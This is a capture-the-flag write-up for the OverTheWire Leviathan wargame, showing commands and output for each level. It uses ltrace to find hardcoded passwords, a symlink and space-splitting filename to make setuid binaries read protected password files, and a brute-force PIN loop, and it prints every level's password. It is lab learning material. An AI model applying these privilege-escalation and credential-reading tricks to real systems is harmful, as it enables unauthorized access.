---
title: Leviathan
date: 2023-05-20 08:05:55 +/-TTTT
categories: [WARGAMES, laviathan]
tags: [ltrace,symlinks]

---

### Level 0

- We ssh to the domain ```leviathan.labs.overthewire.org``` on port ```2223``` with the credentials ```leviathan0:leviathan0```

```sql
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

### Level 0-> 1

- We have a hidden directory ```.backup``` from the home direrectory

```bash
leviathan0@gibson:~$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile
```
- We use grep to hunt for potential passwords from ```bookmarks.html```

```bash
leviathan0@gibson:~$ cd .backup/
leviathan0@gibson:~/.backup$ ls -a
.  ..  bookmarks.html
leviathan0@gibson:~/.backup$ cat bookmarks.html | grep -i password
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | This will be fixed later, the password for leviathan1 is PPIfmI1qsA" ADD_DATE="1155384634" LAST_CHARSET="ISO-8859-1" ID="rdf:#$2wIU71">password to leviathan1</A>
leviathan0@gibson:~/.backup$ 

```
- The pass is ```PPIfmI1qsA```

### Level 1->2

- We have an executable in the home directory which promps for a password on execution

```bash
leviathan1@gibson:~$ ls -a
.  ..  .bash_logout  .bashrc  check  .profile
leviathan1@gibson:~$ ./check 
password: wrt
Wrong password, Good Bye ...
```

- Let's use ```ltrace``` to see the library calls being utilized by the binary

```bash
leviathan1@gibson:~$ ltrace ./check 
__libc_start_main(0x80491e6, 1, 0xffffd5f4, 0 <unfinished ...>
printf("password: ")                                                                                                   = 10
getchar(0xf7fbe4a0, 0xf7fd6f80, 0x786573, 0x646f67password: test
)                                                                    = 116
getchar(0xf7fbe4a0, 0xf7fd6f74, 0x786573, 0x646f67)                                                                    = 101
getchar(0xf7fbe4a0, 0xf7fd6574, 0x786573, 0x646f67)                                                                    = 115
strcmp("tes", "sex")                                                                                                   = 1
puts("Wrong password, Good Bye ..."Wrong password, Good Bye ...
)                                                                                   = 29
+++ exited (status 0) +++
```
- The binary is using ```strcmp``` to compare our password input with ```sex``` which is the hardcorded password

```bash
leviathan1@gibson:~$ ./check 
password: sex
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
mEh5PNl10e
```

### Level 2->3

- The ```printfile``` binary from the home directory, takes a file as an argument and outputs the contents of the file
- We can't get the contents of ```/etc/leviathan_pass/leviathan3```

```bash
leviathan2@gibson:~$ ls -a
.  ..  .bash_logout  .bashrc  printfile  .profile
leviathan2@gibson:~$ ./printfile 
*** File Printer ***
Usage: ./printfile filename
leviathan2@gibson:~$ ./printfile /etc/leviathan_pass/leviathan3
You cant have that file...
```
- The program seems to be using ```cat``` to get the contents of the file

```
leviathan2@gibson:~$ mkdir /tmp/weiss && touch /tmp/weiss/testout.txt
leviathan2@gibson:~$ echo "test the program" > /tmp/weiss/testout.txt
leviathan2@gibson:~$ ./printfile /tmp/weiss/testout.txt
test the program
leviathan2@gibson:~$ 
```

- We runt the program with ```ltrace``` to see the system libraries being used

```bash
leviathan2@gibson:~$ ltrace ./printfile /tmp/weiss/testout.txt
__libc_start_main(0x80491e6, 2, 0xffffd5b4, 0 <unfinished ...>
access("/tmp/weiss/testout.txt", 4)                                                                                    = 0
snprintf("/bin/cat /tmp/weiss/testout.txt", 511, "/bin/cat %s", "/tmp/weiss/testout.txt")                              = 31
geteuid()                                                                                                              = 12002
geteuid()                                                                                                              = 12002
setreuid(12002, 12002)                                                                                                 = 0
system("/bin/cat /tmp/weiss/testout.txt"test the program
 <no return ...>
--- SIGCHLD (Child exited) ---
<... system resumed> )                                                                                                 = 0
+++ exited (status 0) +++

```
- The ```access``` system call checks the access permissions for the specified file
- The binary is  owned by ```laviathan3``` thus executes as him

```
leviathan2@gibson:/tmp/weiss$ touch pass\ file.txt
leviathan2@gibson:/tmp/weiss$ ls
pass file.txt
leviathan2@gibson:/tmp/weiss$ ln -s /etc/leviathan_pass/leviathan3 /tmp/weiss/pass
leviathan2@gibson:/tmp/weiss$ ~/printfile "pass file.txt"
Q0G8j4sakn
/bin/cat: file.txt: No such file or directory
```
### Level 3->4

```bash
leviathan3@gibson:~$ ./level3 
Enter the password> morenothing
bzzzzzzzzap. WRONG
```
- We use ```ltrace``` to identify libraries being used

```bash
leviathan3@gibson:~$ ltrace ./level3 
__libc_start_main(0x80492bf, 1, 0xffffd5f4, 0 <unfinished ...>
strcmp("h0no33", "kakaka")                                                                                             = -1
printf("Enter the password> ")                                                                                         = 20
fgets(Enter the password> test
"test\n", 256, 0xf7e2a620)                                                                                       = 0xffffd3cc
strcmp("test\n", "snlprintf\n")                                                                                        = 1
puts("bzzzzzzzzap. WRONG"bzzzzzzzzap. WRONG
)                                                                                             = 19
+++ exited (status 0) +++

```
- The second comparison is the one being comapred to our password

```bash
leviathan3@gibson:~$ ./level3 
Enter the password> snlprintf
[You've got shell]!
$ whoami
leviathan4
$ cat /etc/leviathan_pass/leviathan4
AgvropI4OA
$ 
```

### Level 4->5

- We have a binary in ```.trash``` directory which outputs binary output on exection

```bash
leviathan4@gibson:~$ ls -a
.  ..  .bash_logout  .bashrc  .profile  .trash
leviathan4@gibson:~$ cd .trash/
leviathan4@gibson:~/.trash$ ls -a
.  ..  bin
leviathan4@gibson:~/.trash$ ./bin 
01000101 01001011 01001011 01101100 01010100 01000110 00110001 01011000 01110001 01110011 00001010 
leviathan4@gibson:~/.trash$ 
```
- We use [cyberchef](https://gchq.github.io/CyberChef/) to convert the binary to ascii
- [Here](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=MDEwMDAxMDEgMDEwMDEwMTEgMDEwMDEwMTEgMDExMDExMDAgMDEwMTAxMDAgMDEwMDAxMTAgMDAxMTAwMDEgMDEwMTEwMDAgMDExMTAwMDEgMDExMTAwMTEgMDAwMDEwMTA) is the result of the conversion
- The pass is ```EKKlTF1Xqs```

### Level 5->6

- We have a binary which is using ```fopen``` to read the contents of the file
- We use symlinks to get the password

```bash
leviathan5@gibson:/tmp/weiss$ ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
leviathan5@gibson:/tmp/weiss$ ~/leviathan5 
YZ55XPVk2l
```
### Level 6->7

```
leviathan6@gibson:~$ ls -a
.  ..  .bash_logout  .bashrc  leviathan6  .profile

```
- The binary needs 4 digits , which we don't know, we opt to go for a brute force

```bash
leviathan6@gibson:~$ for i in {0000..9999}; do ~/leviathan6 $i; done 
```
```bash
$ whoami
leviathan7
$ cat /etc/leviathan_pass/leviathan7
8GpZ5f8Hze
$ 
```

### Level 7

```
leviathan7@gibson:~$ ls -a
.  ..  .bash_logout  .bashrc  CONGRATULATIONS  .profile
leviathan7@gibson:~$ cat CONGRATULATIONS 
Well Done, you seem to have used a *nix system before, now try something more serious.
(Please don't post writeups, solutions or spoilers about the games on the web. Thank you!)
leviathan7@gibson:~$ 

```

